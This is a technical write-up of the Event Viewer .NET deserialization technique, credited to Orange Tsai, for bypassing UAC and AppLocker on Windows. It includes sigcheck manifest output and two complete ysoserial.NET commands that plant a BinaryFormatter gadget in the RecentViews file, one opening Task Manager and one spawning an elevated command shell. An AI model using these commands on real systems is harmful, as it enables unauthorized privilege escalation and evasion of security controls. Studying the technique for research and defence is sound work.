
# Insecure .Net Deserialization

We will be focussing on the .Net Deserialization vulnerability in Event Viewer to bypass `User Account Control`, to elevate ourselves to a higher integrity user,
and `AppLocker`. 

Originally discovered by @orange_8361, when we open up `Event Viewer` and look at `Process Monitor`, we can see that it actually tries to query and open up a file called
`RecentViews`.

<img width="951" alt="image" src="https://user-images.githubusercontent.com/12537739/174975253-eb5fe8c3-adf0-4124-afe9-7924e3d38a57.png">

<img width="546" alt="image" src="https://user-images.githubusercontent.com/12537739/174975791-864e2dd5-9ae7-45f7-84fd-fafa357a05a6.png">


The file is located at `C:\Users\<username>\AppData\Local\Microsoft\Event Viewer\RecentViews`. 

> Note: If the file is not present, you can simply browse through Event Viewer and check
some logs, which will then create the `RecentViews` file. 

Let's take a look at the file.

<img width="541" alt="image" src="https://user-images.githubusercontent.com/12537739/174977088-b4e69819-6ba4-4ab5-9823-e52d118d6c3c.png">

We can see some unprintable characters(binary) and some ascii relating to .NET classes like `System.Collections.ArrayList`. Hence most likely, this is a
.NET object that has been serialized using a Binary Formatter.

However, the docs from Microsoft itself says that the `BinaryFormatter` is insecure and should not be used.

<img width="650" alt="image" src="https://user-images.githubusercontent.com/12537739/174977496-7612a5d1-2fbc-49a6-8c1e-5fd25e9a1f85.png">

The fact that the Windows Event Viewer deserializes it using the BinaryFormatter to show the contents in the recent events user interface, poses a `Insecure Deserialization Vulnerabilty`.

<img width="1280" alt="image" src="https://user-images.githubusercontent.com/12537739/174978518-e2c48a26-0dde-46d5-98b3-b034a150d8ec.png">

Another interesting thing to note is the manifest of `EventViewer` itself.

Using a tool like `sigcheck.exe`, we can see that the manifest of `eventvwr.exe` is set to `auto-elevate`.

```sh
C:\Users\wirel\OneDrive\Documents\SigCheck>sigcheck64.exe -m C:\Windows\System32\eventvwr.exe

Sigcheck v2.82 - File version and signature viewer
Copyright (C) 2004-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

c:\windows\system32\eventvwr.exe:
        Verified:       Signed
        Signing date:   3:09 pm 29/4/2022
        Publisher:      Microsoft Windows
        Company:        Microsoft Corporation
        Description:    Event Viewer Snapin Launcher
        Product:        Microsoft« Windows« Operating System
        Prod version:   10.0.22000.653
        File version:   10.0.22000.653 (WinBuild.160101.0800)
        MachineType:    64-bit
        Manifest:
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!-- Copyright (c) Microsoft Corporation -->
<assembly xmlns="urn:schemas-microsoft-com:asm.v1"  xmlns:asmv3="urn:schemas-microsoft-com:asm.v3" manifestVersion="1.0">
<assemblyIdentity
    version="5.1.0.0"
    processorArchitecture="amd64"
    name="Microsoft.Windows.Eventlog.EventVwr"
    type="win32"
/>
<description>Event Viewer Snapin Launcher</description>

<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
        <requestedPrivileges>
            <requestedExecutionLevel
                level="highestAvailable"
                uiAccess="false"
            />
        </requestedPrivileges>
    </security>
</trustInfo>
<asmv3:application>
   <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
        <autoElevate>true</autoElevate>
   </asmv3:windowsSettings>
</asmv3:application>
</assembly>
```
We can see the xml element `<autoElevate>true</autoElevate>` which allows eventviewer to bypass uac.

We thus could create a `Deserialization gadget` to execute any files, bypassing UAC and Applocker.

We can use `ysoserial .NET` to create our `Deserialization gadget`. 

I have set my UAC permissions to the max.

<img width="561" alt="image" src="https://user-images.githubusercontent.com/12537739/174980287-53062380-8633-4865-9004-f4d4c1d7a5aa.png">

If i were to open `taskmgr`, we can see UAC intefering with us.
<img width="286" alt="image" src="https://user-images.githubusercontent.com/12537739/174980615-162f5dea-ef27-476f-a1d7-ec73a3c9cefe.png">

<img width="509" alt="image" src="https://user-images.githubusercontent.com/12537739/174980796-efeec65d-d84c-4750-b7de-339ce2503cb5.png">

Now let's use `ysoserial .NET` to create our `Deserialization gadget`. 

```sh
ysoserial.exe -o raw -g DataSet -f BinaryFormatter -c taskmgr > 
"C:\Users\wirel\AppData\Local\Microsoft\Event Viewer\RecentViews"
```
Now when we open up EventViewer, it will be succum to insecure deserialization and open our task manager, bypassing UAC. This technique can also be used to bypass Applocker.

<img width="1253" alt="image" src="https://user-images.githubusercontent.com/12537739/174981505-96f67864-caf1-4d36-887a-5a926ac60327.png">

If this was an Admin account, attackers can easily spawn an elevated Administrator shell.

```sh
ysoserial.exe --output=raw --gadget=DataSet --formatter=BinaryFormatter 
--command=powershell "start cmd -v runAs" --rawcmd > 
"C:\Users\wirel\AppData\Local\Microsoft\Event Viewer\RecentViews"
```


<img width="1269" alt="image" src="https://user-images.githubusercontent.com/12537739/174982518-abb03987-d299-4002-b932-654ccf7b911e.png">


We have just spawned an elevated command shell from a non-elevated Administrator perspective, bypassing UAC and Applocker.

# Credits

[Original founder Orange Tsai](https://twitter.com/orange_8361)
